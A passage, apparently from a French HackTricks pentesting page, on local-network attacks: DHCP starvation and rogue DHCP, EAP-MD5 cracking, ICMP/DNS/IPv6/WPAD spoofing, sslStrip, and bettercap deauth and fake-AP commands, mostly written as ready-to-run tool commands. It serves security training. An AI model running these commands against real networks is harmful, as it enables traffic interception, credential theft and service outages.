Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Il existe **deux types de DoS** qui peuvent être effectués contre les serveurs DHCP. Le premier consiste à **simuler suffisamment de faux hôtes pour utiliser toutes les adresses IP possibles**.\
Cette attaque ne fonctionnera que si vous pouvez voir les réponses du serveur DHCP et terminer le protocole (**Découverte** (Comp) --> **Offre** (serveur) --> **Demande** (Comp) --> **ACK** (serveur)). Par exemple, cela n'est **pas possible dans les réseaux Wifi**.

Une autre façon de réaliser un DoS DHCP est d'envoyer un **paquet DHCP-RELEASE en utilisant comme code source chaque IP possible**. Ensuite, le serveur pensera que tout le monde a fini d'utiliser l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Une façon plus automatique de faire cela est d'utiliser l'outil [DHCPing](https://github.com/kamorin/DHCPig).

Vous pouvez utiliser les attaques DoS mentionnées pour forcer les clients à obtenir de nouvelles adresses dans l'environnement, et épuiser les serveurs légitimes pour qu'ils deviennent non réactifs. Ainsi, lorsque les légitimes essaient de se reconnecter, **vous pouvez leur servir des valeurs malveillantes mentionnées dans l'attaque suivante**.

#### Définir des valeurs malveillantes

Vous pouvez utiliser le script DHCP de Responder (_/usr/share/responder/DHCP.py_) pour établir un serveur DHCP malveillant. Définir une passerelle malveillante n'est pas idéal, car la connexion détournée est seulement semi-duplex (c'est-à-dire que nous capturons les paquets de sortie du client, mais pas les réponses de la passerelle légitime). Par conséquent, je recommande de définir un serveur DNS ou WPAD malveillant pour capturer le trafic HTTP et les informations d'identification en particulier.

| Description                                 | Exemple                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Notre adresse IP, annoncée comme passerelle | _-i 10.0.0.100_                                                              |
| Le nom de domaine DNS local (facultatif)    | _-d example.org_                                                             |
| Adresse IP du routeur/passerelle d'origine  | _-r 10.0.0.1_                                                                |
| Adresse IP du serveur DNS primaire          | _-p 10.0.0.100_                                                              |
| Adresse IP du serveur DNS secondaire (facultatif) | _-s 10.0.0.1_                                                            |
| Le masque de sous-réseau du réseau local    | _-n 255.255.255.0_                                                           |
| L'interface pour écouter le trafic DHCP     | _-I eth1_                                                                    |
| Adresse de configuration WPAD (URL)         | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Spoof l'adresse IP de la passerelle par défaut | -S                                                                           |
| Répondre à toutes les demandes DHCP (très bruyant) | -R                                                                           |

### **Attaques EAP**

Voici quelques tactiques d'attaque qui peuvent être utilisées contre les implémentations 802.1X :

* Brute-force actif de mot de passe via EAP
* Attaque du serveur RADIUS avec un contenu EAP malformé _\*\*_(exploits)
* Capture de messages EAP et craquage de mot de passe hors ligne (EAP-MD5 et PEAP)
* Forcer l'authentification EAP-MD5 pour contourner la validation du certificat TLS
* Injection de trafic réseau malveillant lors de l'authentification à l'aide d'un concentrateur ou similaire

Si l'attaquant est entre la victime et le serveur d'authentification, il pourrait essayer de dégrader (si nécessaire) le protocole d'authentification en EAP-MD5 et capturer la tentative d'authentification. Ensuite, il pourrait effectuer une attaque de force brute avec :
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Attaques FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) est une classe de protocoles réseau conçus pour **créer un système de routage redondant à chaud**. Avec FHRP, des routeurs physiques peuvent être combinés en un seul dispositif logique, ce qui augmente la tolérance aux pannes et aide à répartir la charge.

**Les ingénieurs de Cisco Systems ont développé deux protocoles FHRP, GLBP et HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Trois versions du protocole de routage RIP (Routing Information Protocol) existent - RIP, RIPv2 et RIPng. RIP et RIPv2 utilisent des datagrammes UDP envoyés à des pairs via le port 520, tandis que RIPng diffuse des datagrammes sur le port UDP 521 via une multidiffusion IPv6. RIPv2 a introduit la prise en charge de l'authentification MD5. RIPng n'intègre pas d'authentification native ; elle repose plutôt sur des en-têtes IPsec AH et ESP facultatifs dans IPv6.

Pour plus d'informations sur la façon d'attaquer ce protocole, consultez le livre _**Network Security Assessment: Know Your Network (3ème édition).**_

### Attaques EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** est un protocole de routage dynamique. **C'est un protocole de vecteur de distance.** Si **aucune authentification** et configuration des interfaces passives n'est effectuée, un **intrus** peut interférer avec le routage EIGRP et causer **une intoxication des tables de routage**. De plus, le réseau EIGRP (en d'autres termes, le système autonome) **est plat et n'a pas de segmentation en zones**. Si un **attaquant injecte une route**, il est probable que cette route se **propage** dans tout le système autonome EIGRP.

Pour attaquer un système EIGRP, il faut **établir une relation de voisinage avec un routeur EIGRP légitime**, ce qui ouvre de nombreuses possibilités, de la reconnaissance de base à diverses injections.

\*\*\*\*[**FRRouting**](https://frrouting.org/) vous permet de mettre en place **un routeur virtuel qui prend en charge BGP, OSPF, EIGRP, RIP et d'autres protocoles.** Tout ce que vous avez à faire est de le déployer sur le système de votre attaquant et vous pouvez en fait prétendre être un routeur légitime dans le domaine de routage.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) prend également en charge la capture des diffusions EIGRP et l'injection de paquets pour manipuler la configuration de routage. Pour plus d'informations sur la façon de l'attaquer avec Coly, consultez le livre _**Network Security Assessment: Know Your Network (3ème édition).**_

### OSPF

La plupart des implémentations d'Open Shortest Path First (OSPF) utilisent MD5 pour fournir une authentification entre les routeurs. Loki et John the Ripper peuvent capturer et attaquer les hachages MD5 pour révéler la clé, qui peut ensuite être utilisée pour annoncer de nouvelles routes. Les paramètres de routage sont définis en utilisant l'onglet _Injection_, et la clé est définie sous _Connection_.

Pour plus d'informations sur la façon d'attaquer ce protocole, consultez le livre _**Network Security Assessment: Know Your Network (3ème édition).**_

### Autres outils et sources génériques

* [**Above**](https://github.com/c4s73r/Above) : Outil pour scanner le trafic réseau et trouver des vulnérabilités
* Vous pouvez trouver plus d'informations sur les attaques réseau [ici](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Tout lire et toutes les nouvelles attaques, le cas échéant)_

## **Spoofing**

L'attaquant configure tous les paramètres réseau (GW, IP, DNS) du nouveau membre du réseau en envoyant de fausses réponses DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Vérifiez la [section précédente](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste à envoyer un paquet ICMP de type 1 code 5 qui indique que l'attaquant est le meilleur moyen d'atteindre une adresse IP. Ensuite, lorsque la victime veut contacter l'adresse IP, elle envoie le paquet à travers l'attaquant.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaquant va résoudre certains (ou tous) les domaines que la victime demande.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurer son propre DNS avec dnsmasq**

Il est possible de configurer son propre serveur DNS en utilisant dnsmasq. Cela peut être utile pour rediriger le trafic vers des adresses IP spécifiques ou pour effectuer des attaques de phishing. Voici les étapes à suivre pour configurer dnsmasq :

1. Installer dnsmasq : `sudo apt-get install dnsmasq`

2. Éditer le fichier de configuration dnsmasq : `sudo nano /etc/dnsmasq.conf`

3. Ajouter les entrées DNS souhaitées en utilisant la syntaxe suivante : `address=/domain.com/IP_address`

4. Redémarrer dnsmasq : `sudo systemctl restart dnsmasq`

Une fois que dnsmasq est configuré, il est possible de configurer le serveur DNS de votre machine pour utiliser le serveur dnsmasq.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Passerelles locales

Il existe souvent plusieurs routes vers des systèmes et des réseaux. Après avoir dressé une liste des adresses MAC dans le réseau local, utilisez _gateway-finder.py_ pour identifier les hôtes qui prennent en charge le transfert IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/) 
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Les systèmes Microsoft utilisent Link-Local Multicast Name Resolution (LLMNR) et le service de noms NetBIOS (NBT-NS) pour la résolution locale de l'hôte lorsque les recherches DNS échouent. Les implémentations Linux zero-configuration et Apple Bonjour utilisent Multicast DNS (mDNS) pour découvrir les systèmes au sein d'un réseau. Ces protocoles ne sont pas authentifiés et diffusent des messages sur UDP ; ainsi, les attaquants peuvent les exploiter pour diriger les utilisateurs vers des services malveillants.

Vous pouvez vous faire passer pour des services recherchés par des hôtes en utilisant Responder pour envoyer de fausses réponses.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

De nombreux navigateurs utilisent Web Proxy Auto-Discovery (WPAD) pour charger les paramètres de proxy à partir du réseau. Un serveur WPAD fournit les paramètres de proxy client via une URL particulière (par exemple, [http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)) lorsqu'il est identifié par l'un des éléments suivants :

* DHCP, en utilisant une entrée de code 252[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, en recherchant le nom d'hôte _wpad_ dans le domaine local
* Microsoft LLMNR et NBT-NS (en cas d'échec de la recherche DNS)

Responder automatise l'attaque WPAD - en exécutant un proxy et en dirigeant les clients vers un serveur WPAD malveillant via DHCP, DNS, LLMNR et NBT-NS.\
Lisez ici plus d'informations sur [comment se faire passer pour des services avec Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Vous pouvez offrir différents services dans le réseau pour essayer de **tromper un utilisateur** pour qu'il entre des **informations d'identification en texte clair**. **Plus d'informations sur cette attaque dans** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### Spoofing de voisin IPv6

Cette attaque est très similaire à l'attaque ARP Spoofing mais dans le monde IPv6. Vous pouvez faire croire à la victime que l'IPv6 de la passerelle a l'adresse MAC de l'attaquant.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding de l'annonceur de routeur IPv6

Certains systèmes d'exploitation configurent par défaut la passerelle à partir des paquets RA envoyés dans le réseau. Pour déclarer l'attaquant comme routeur IPv6, vous pouvez utiliser:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing DHCP IPv6

Par défaut, certains systèmes d'exploitation tentent de configurer le DNS en lisant un paquet DHCPv6 dans le réseau. Ensuite, un attaquant pourrait envoyer un paquet DHCPv6 pour se configurer en tant que DNS. Le DHCP fournit également une adresse IPv6 à la victime.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fausse page et injection de code JS)

## Attaques Internet

### sslStrip

Essentiellement, cette attaque consiste à maintenir une connexion HTTP avec le client et une connexion HTTPS avec le serveur, de sorte que si l'utilisateur essaie d'accéder à une page HTTP qui redirige vers la version HTTPS, sslStrip pourra intercepter la connexion en texte clair.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Plus d'informations [ici](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ et dns2proxy pour contourner HSTS

La **différence** entre **sslStrip+ et dns2proxy** par rapport à **sslStrip** est qu'ils vont **rediriger** par exemple _**www.facebook.com**_ **vers** _**wwww.facebook.com**_ (notez le **w** supplémentaire) et vont définir l'**adresse de ce domaine comme l'adresse IP de l'attaquant**. De cette façon, le **client** se **connectera** à _**wwww.facebook.com**_ **(l'attaquant)** mais en arrière-plan, **sslstrip+** maintiendra la **vraie connexion** via https avec **www.facebook.com**.

Le **but** de cette technique est de **contourner HSTS** car _**wwww**.facebook.com_ **ne sera pas** enregistré dans le **cache** du navigateur, de sorte que le navigateur sera trompé pour effectuer **l'authentification Facebook en HTTP**.\
Notez que pour effectuer cette attaque, la victime doit essayer d'accéder initialement à [http://www.faceook.com](http://www.faceook.com) et non à https. Cela peut être fait en modifiant les liens à l'intérieur d'une page http.

Plus d'informations [ici](https://www.bettercap.org/legacy/#hsts-bypass), [ici](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) et [ici](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ou sslStrip+ ne fonctionne plus. Cela est dû aux règles HSTS préenregistrées dans les navigateurs, donc même si c'est la première fois qu'un utilisateur accède à un domaine "important", il y accédera via HTTPS. De plus, notez que les règles préenregistrées et les autres règles générées peuvent utiliser le drapeau** [**`includeSubdomains`**](https://hstspreload.appspot.com) **donc l'exemple _**wwww.facebook.com**_ précédent ne fonctionnera plus car** _**facebook.com**_ **utilise HSTS avec `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Écoute TCP sur le port
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## Écoute TCP + SSL sur le port

#### Générer des clés et un certificat auto-signé
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Écouter en utilisant un certificat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Écouter en utilisant un certificat et rediriger vers les hôtes
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Parfois, si le client vérifie que le CA est valide, vous pouvez **servir un certificat d'un autre nom d'hôte signé par un CA**.\
Un autre test intéressant consiste à servir un **certificat du nom d'hôte demandé mais auto-signé**.

D'autres choses à tester consistent à essayer de signer le certificat avec un certificat valide qui n'est pas un CA valide. Ou utiliser la clé publique valide, forcer à utiliser un algorithme comme diffie hellman (qui n'a pas besoin de décrypter quoi que ce soit avec la vraie clé privée) et lorsque le client demande une sonde de la vraie clé privée (comme un hash), envoyer une fausse sonde et s'attendre à ce que le client ne vérifie pas cela.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events 
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notes de découverte active

Il faut prendre en compte que lorsqu'un paquet UDP est envoyé à un appareil qui n'a pas le port demandé, un ICMP (Port Unreachable) est envoyé.

### **Découverte ARP**

Les paquets ARP sont utilisés pour découvrir quelles adresses IP sont utilisées à l'intérieur du réseau. Le PC doit envoyer une demande pour chaque adresse IP possible et seules celles qui sont utilisées répondront.

### **mDNS (multicast DNS)**

Bettercap envoie une demande MDNS (toutes les X ms) demandant **\_services\_.dns-sd.\_udp.local**. La machine qui voit ce paquet répond généralement à cette demande. Ensuite, il ne recherche que les machines répondant aux "services".

**Outils**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap diffuse des paquets sur le port 137/UDP demandant le nom "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap diffuse des paquets SSDP recherchant tous types de services (port UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap diffuse des paquets WSD recherchant des services (port UDP 3702).

## Références

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce de prime de bug**: **inscrivez-vous** à **Intigriti**, une plateforme de prime de bug premium créée par des hackers, pour les hackers ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) dès aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
